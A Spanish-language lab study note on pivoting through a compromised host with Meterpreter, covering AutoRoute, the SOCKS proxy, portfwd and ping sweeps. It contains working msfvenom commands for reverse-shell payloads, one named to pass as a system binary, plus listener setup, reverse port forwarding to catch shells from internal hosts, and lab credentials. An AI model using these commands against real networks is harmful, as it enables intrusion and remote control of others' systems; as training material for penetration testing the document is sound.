
## 🧠 Concepto clave

Cuando se dispone de una sesión Meterpreter sobre el pivot host en lugar de acceso SSH directo, Metasploit ofrece su propio ecosistema de pivoting sin depender de ninguna herramienta externa. Los tres mecanismos principales son complementarios y frecuentemente se usan juntos:

| Mecanismo | Módulo / Comando | Función |
|---|---|---|
| **AutoRoute** | `post/multi/manage/autoroute` | Añade rutas de red a la tabla de routing interna de Metasploit para que el tráfico de MSF alcance redes internas a través de la sesión Meterpreter |
| **SOCKS Proxy** | `auxiliary/server/socks_proxy` | Crea un servidor SOCKS local que, combinado con AutoRoute, permite usar herramientas externas (nmap, xfreerdp, etc.) contra la red interna vía proxychains |
| **portfwd** | `meterpreter > portfwd` | Port forwarding directo dentro de la sesión Meterpreter — redirige puertos locales del atacante hacia servicios específicos de la red interna |

La ventaja sobre SSH es que todo el pivoting queda integrado dentro de Metasploit: las sesiones, las rutas y el proxy SOCKS se gestionan desde `msfconsole` sin necesidad de terminales adicionales ni herramientas externas en el pivot host.

---

## 📌 Escenario de laboratorio
```
[Atacante 10.10.14.18]
        ↕ Meterpreter session 1 (puerto 8080)
[Ubuntu pivot 10.129.202.64 / 172.16.5.129]
        ↕ red interna
[Windows DC01 172.16.5.19]  ← no alcanzable directamente desde el atacante
```

---

## 📌 Paso 1 — Obtener sesión Meterpreter en el pivot host

> [!tip] Generar payload Meterpreter para Linux (pivot host Ubuntu)
> ```bash
> msfvenom -p linux/x64/meterpreter/reverse_tcp \
>     LHOST=10.10.14.18 \
>     LPORT=8080 \
>     -f elf \
>     -o backupjob
> ```
> `-p linux/x64/meterpreter/reverse_tcp` — Payload Meterpreter de 64 bits para Linux con conexión TCP inversa.
> `LHOST=10.10.14.18` — IP del atacante — a donde conectará el pivot al ejecutarse el payload.
> `LPORT=8080` — Puerto del listener en el atacante.
> `-f elf` — Formato ELF: ejecutable nativo de Linux.
> `-o backupjob` — Nombre del archivo de salida. Sin extensión para que parezca un binario del sistema.

> [!tip] Configurar el listener multi/handler para recibir la sesión del pivot
> ```bash
> msfconsole -q
> use exploit/multi/handler
> set payload linux/x64/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> set LPORT 8080
> run
> ```
> `set LHOST 0.0.0.0` — Escuchar en todas las interfaces del atacante.
> `set LPORT 8080` — Puerto que coincide con el `LPORT` del payload generado con msfvenom.

> [!tip] Transferir y ejecutar el payload en el pivot host Ubuntu
> ```bash
> # Desde el atacante — transferir con SCP
> scp backupjob ubuntu@10.129.202.64:~/
>
> # En el Ubuntu (sesión SSH o shell previa)
> chmod +x backupjob
> ./backupjob
> ```
> `chmod +x` — Da permisos de ejecución al binario ELF. Sin este paso el OS rechazará ejecutarlo.

Tras ejecutar el payload, la sesión Meterpreter queda establecida:
```
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826)
meterpreter > pwd
/home/ubuntu
```

---

## 📌 Paso 2 — Descubrimiento de hosts con ping sweep

Con la sesión Meterpreter activa sobre el pivot, el primer paso es descubrir qué hosts están activos en la red interna `172.16.5.0/23`.

> [!info] **post/multi/gather/ping_sweep**
> Módulo de post-explotación de Metasploit que lanza un ping sweep desde el host comprometido hacia el rango de IPs especificado. El tráfico ICMP se genera desde el pivot host, no desde el atacante, por lo que llega a redes que el atacante no puede alcanzar directamente. Solo devuelve resultados de hosts que respondan a ICMP — los hosts con firewall que bloqueen ICMP no aparecerán.

> [!tip] Ping sweep desde Meterpreter hacia la red interna
> ```bash
> # Dentro de la sesión Meterpreter
> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
> ```
> `RHOSTS=172.16.5.0/23` — Rango de IPs a escanear. El módulo genera el tráfico ICMP desde el pivot host Ubuntu.

Alternativas si no se puede usar el módulo de MSF — one-liners ejecutables desde una shell en el pivot:

> [!tip] Ping sweep manual con bucle for en Linux (desde shell en pivot)
> ```bash
> for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
> ```
> `{1..254}` — Itera sobre todos los hosts posibles del segmento /24.
> `-c 1` — Un solo ping por host.
> `grep "bytes from"` — Filtra solo los hosts que responden.
> `&` — Lanza cada ping en background para que se ejecuten en paralelo — sin esto sería extremadamente lento.

> [!tip] Ping sweep con CMD en pivot Windows
> ```cmd
> for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
> ```
> `/L %i in (1 1 254)` — Bucle de 1 a 254 con incremento de 1.
> `-n 1` — Un solo ping por host.
> `-w 100` — Timeout de 100ms por ping.
> `find "Reply"` — Filtra solo las respuestas positivas.

> [!tip] Ping sweep con PowerShell en pivot Windows
> ```powershell
> 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
> ```
> `1..254` — Genera el rango numérico.
> `$_` — Variable de pipeline — el número de host actual.
> `Test-Connection -quiet` — Devuelve `True` si el host responde, `False` si no.

> [!important] Un ping sweep puede no obtener respuestas en el primer intento, especialmente al cruzar redes. Los hosts pueden no tener aún la entrada ARP del origen en su caché. Repetir el sweep al menos dos veces si los resultados parecen incompletos.

---

## 📌 Paso 3 — AutoRoute + SOCKS Proxy para escaneo con proxychains

Cuando ICMP está bloqueado o se necesita escanear puertos (no solo comprobar si los hosts viven), se combina AutoRoute con el módulo SOCKS para enrutar tráfico arbitrario a través de la sesión Meterpreter.

### **3a — Configurar el servidor SOCKS proxy de Metasploit**

> [!info] **auxiliary/server/socks_proxy**
> Módulo auxiliar de Metasploit que levanta un servidor SOCKS en el atacante. A diferencia del proxy SOCKS creado por `ssh -D`, este proxy usa las rutas de la tabla interna de Metasploit (configuradas con AutoRoute) para enrutar el tráfico — no necesita SSH. Soporta SOCKS4a y SOCKS5. Se ejecuta como job en background y queda activo mientras MSF esté corriendo.

> [!tip] Levantar el servidor SOCKS proxy de Metasploit
> ```bash
> use auxiliary/server/socks_proxy
> set SRVPORT 9050
> set SRVHOST 0.0.0.0
> set version 4a
> run
> jobs   # verificar que el job está activo
> ```
> `SRVPORT 9050` — Puerto donde escuchará el proxy SOCKS — mismo que usa proxychains por defecto.
> `SRVHOST 0.0.0.0` — Escuchar en todas las interfaces del atacante.
> `version 4a` — Versión del protocolo SOCKS. Opciones: `4a` o `5`. SOCKS5 añade soporte UDP y autenticación.
> `run` — Lo lanza como job en background — no bloquea la consola de MSF.

> [!tip] Verificar configuración de proxychains
> ```bash
> tail -4 /etc/proxychains.conf
> # Debe contener:
> # socks4  127.0.0.1 9050
>
> # Si no está, añadirla:
> echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains.conf
> ```

### **3b — Añadir rutas con AutoRoute**

> [!info] **post/multi/manage/autoroute**
> Módulo de post-explotación que añade rutas a la tabla de routing interna de Metasploit. Permite que el tráfico de MSF (y del proxy SOCKS) dirigido a redes especificadas sea enrutado a través de la sesión Meterpreter activa, usando el pivot host como gateway. AutoRoute lee la tabla de routing del pivot host y puede añadir automáticamente las rutas que ya conoce.

> [!tip] Añadir rutas automáticamente desde la tabla de routing del pivot
> ```bash
> use post/multi/manage/autoroute
> set SESSION 1
> set SUBNET 172.16.5.0
> run
> ```
> `set SESSION 1` — ID de la sesión Meterpreter del pivot host a través de la cual se enrutará el tráfico.
> `set SUBNET 172.16.5.0` — Red destino a la que se quiere acceder. AutoRoute infiere la máscara desde la tabla de routing del pivot.

Alternativa — añadir la ruta directamente desde la sesión Meterpreter:

> [!tip] Añadir ruta desde la sesión Meterpreter directamente
> ```bash
> # Dentro de la sesión Meterpreter
> run autoroute -s 172.16.5.0/23
> run autoroute -p    # listar rutas activas
> ```
> `-s 172.16.5.0/23` — Añade la ruta a esa subred a través de la sesión activa.
> `-p` — Print: muestra la tabla de routing activa de Metasploit para verificar que la ruta se añadió correctamente.

La tabla de rutas activa debe mostrar:
```
Subnet             Netmask            Gateway
------             -------            -------
10.129.0.0         255.255.0.0        Session 1
172.16.5.0         255.255.254.0      Session 1
```

### **3c — Escanear con nmap a través del proxy**

> [!tip] Escanear la red interna con nmap vía proxychains + AutoRoute
> ```bash
> proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
> ```
> `proxychains` — Redirige el tráfico de nmap al proxy SOCKS en 127.0.0.1:9050 → Metasploit → sesión Meterpreter → pivot Ubuntu → red interna.
> `-sT` — TCP Connect Scan: obligatorio con proxychains (no soporta paquetes parciales).
> `-Pn` — Sin ping previo: imprescindible para hosts Windows (ICMP bloqueado por Defender).

---

## 📌 Paso 4 — portfwd: port forwarding directo desde Meterpreter

`portfwd` es el equivalente Meterpreter del flag `-L` de SSH. Permite redirigir un puerto local del atacante directamente hacia un servicio específico de la red interna sin necesidad de proxychains.

### **portfwd forward — Local port forwarding**

> [!tip] Redirigir RDP del DC01 al puerto local 3300 del atacante
> ```bash
> # Dentro de la sesión Meterpreter
> portfwd add -l 3300 -p 3389 -r 172.16.5.19
> ```
> `-l 3300` — **L**ocal port: puerto en el atacante donde escuchará el forward.
> `-p 3389` — **P**ort destino: puerto del servicio en el host remoto (RDP).
> `-r 172.16.5.19` — **R**emote host: IP del host destino en la red interna.

> [!tip] Listar los port forwards activos
> ```bash
> portfwd list
> ```

> [!tip] Conectar por RDP al DC01 usando el port forward local
> ```bash
> # Desde el atacante — conectar a localhost:3300 que redirige a 172.16.5.19:3389
> xfreerdp /v:localhost:3300 /u:victor /p:pass@123
> ```
> La conexión RDP se establece a `localhost:3300` en el atacante. Meterpreter la reenvía transparentemente a `172.16.5.19:3389` a través del pivot.

Verificar con netstat que el port forward está activo:
```bash
netstat -antp | grep 3300
# tcp  0  0  127.0.0.1:54652  127.0.0.1:3300  ESTABLISHED  4075/xfreerdp
```

### **portfwd reverse — Reverse port forwarding**

El reverse port forwarding de Meterpreter es equivalente al `ssh -R`: hace que el pivot host escuche en un puerto y reenvíe las conexiones entrantes al atacante. Permite recibir reverse shells de hosts internos sin configurar túneles SSH adicionales.

> [!tip] Configurar reverse port forwarding en Meterpreter
> ```bash
> # Dentro de la sesión Meterpreter del pivot
> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
> ```
> `-R` — Indica que es un **R**everse port forward (no local).
> `-l 8081` — Puerto **local** del atacante donde recibirá las conexiones reenviadas.
> `-p 1234` — Puerto en el pivot host donde se escucharán las conexiones entrantes del Windows.
> `-L 10.10.14.18` — IP del atacante a donde se reenviarán las conexiones.

> [!tip] Configurar listener en MSF para recibir la reverse shell del Windows
> ```bash
> # Backgroundear la sesión Meterpreter
> bg
>
> # Configurar handler en el puerto 8081
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> set LPORT 8081
> run
> ```

> [!tip] Generar payload Windows que apunte al pivot (no al atacante)
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp \
>     LHOST=172.16.5.129 \
>     LPORT=1234 \
>     -f exe \
>     -o backupscript.exe
> ```
> `LHOST=172.16.5.129` — IP del pivot Ubuntu en la red interna — la única IP que el Windows puede alcanzar.
> `LPORT=1234` — Puerto en el pivot donde `portfwd -R` está escuchando.

Al ejecutar el payload en el Windows, el flujo es:
```
[Windows:1234] → [Ubuntu pivot:1234] → [portfwd -R] → [túnel Meterpreter] → [Atacante:8081] → [MSF handler]
```

---

## 📌 Comparativa de métodos de pivoting con Meterpreter

| Necesidad | Método | Comando |
|---|---|---|
| Escanear toda una red interna con nmap | AutoRoute + SOCKS + proxychains | `autoroute` + `socks_proxy` + `proxychains nmap` |
| Acceder a un servicio concreto (RDP, SMB) | portfwd add | `portfwd add -l LOCAL -p REMOTE_PORT -r REMOTE_IP` |
| Recibir reverse shell desde host interno | portfwd reverse | `portfwd add -R -l LOCAL -p PIVOT_PORT -L ATTACKER_IP` |
| Descubrir hosts activos en red interna | ping_sweep | `run post/multi/gather/ping_sweep RHOSTS=red/mask` |

---

## 🔗 Relaciones / Contexto

El pivoting con Meterpreter es la evolución natural del pivoting con SSH cuando el entorno permite desplegar un payload en el pivot host. La gran ventaja es la integración: todo se gestiona desde una sola consola de `msfconsole` — sesiones, rutas, proxy SOCKS y port forwards — sin necesidad de gestionar múltiples terminales SSH ni recordar qué túneles están activos. AutoRoute es especialmente potente porque lee la tabla de routing del pivot automáticamente, descubriendo redes internas sin necesidad de especificarlas manualmente. La combinación AutoRoute + socks_proxy + proxychains replica exactamente la funcionalidad del `ssh -D` pero de forma completamente contenida dentro de Metasploit, lo que facilita el trabajo en assessments complejos con múltiples pivots encadenados — escenario central del examen eCPPT.